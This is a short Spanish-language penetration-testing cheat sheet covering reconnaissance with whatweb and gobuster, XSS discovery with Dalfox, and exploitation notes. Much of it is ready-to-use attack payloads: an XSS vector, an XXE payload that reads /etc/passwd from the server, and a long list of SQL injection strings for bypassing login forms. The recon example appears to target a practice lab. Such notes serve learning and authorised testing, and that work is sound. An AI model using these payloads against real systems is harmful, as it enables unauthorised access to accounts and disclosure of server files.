# Cheetsheet Pentest

## Reconocimiento

### Información básica

Con herramientas como whatweb podemos hacer un reconocimiento inicial del sitio web para obtener información como la IP, el SO del servidor, en que país está este alojado o alguna vulnerabilidad básica, como XSS.

``` bash
└─$ whatweb <URL>
http://35.227.24.107/d6a05ac5cf/ [200 OK] Country[UNITED STATES][US], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[35.227.24.107], Script, Title[Micro-CMS], maybe Vulnerable-To-XSS[["", "alert(1)"] ], nginx[1.14.0]
```



### Listado de directorios

Para la enumeración de directorios podemos utilizar gobuster dir.

```┌──(flow㉿flow)-[~]
└─$ gobuster dir -u <URL> -w <WORDLIST>
```



### Archivos interesantes

Podemos modificar la URL para encontrar archivos en el servidor como *robots.txt* o *crossdomain.xml*.





## Reconocimiento avanzado

### XSS

Para encontrar vulnerabilidades XSS podemos utilizar una herramienta llamada Dalfox. Esta nos devolverá los payloads inyectables a una web que es vulnerable a XSS.

```┌──(flow㉿flow)-[~]
└─$ sudo docker run -it hahwul/dalfox:latest /app/dalfox url <http://example.com/inicio.php?"parametro">
```

Ejemplo:

``` ┌──(flow㉿flow)-[~]
[V] Triggered XSS Payload (found DOM Object): id="><svg/OnLoad="`${prompt``}`" class=dalfox>
    1 line:  "><svg/OnLoad="`${prompt``}`" class=dalfox><body>
```



### XXE

Si analizamos las peticiones que se envian al servidor y vemos que los datos pasan por XML podríamos explotar esta vulnerabilidad para acceder a archivos del servidor:

```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM  "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

Si modificamos la petición que contiene el XML con este código podríamos, por ejemplo, acceder al fichero /etc/passwd.



### SQLI

Para saber si una web que utiliza una BBDD para un login, por ejemplo, es vulnerable a SQLInjection debemos introducir carácteres como las `` "``. Si nos aparece un error interno del servidor (y no un error de usuario y contraseña inválidos) o directamente no nos aparece ningún error es probable que sea vulnerable.

En el apartado de explotación explico como utilizar SQLMap para explotar y extraer información de una base de datos.

#### Hacer login con bypass:

```
'-'
' '
'&'
'^'
'*'
' or 1=1 limit 1 -- -+
'="or'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
'-||0'
"-||0"
"-"
" "
"&"
"^"
"*"
'--'
"--"
'--' / "--"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 2 like 2
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' -- -
admin' #
admin'/*
admin' or '2' LIKE '1
```
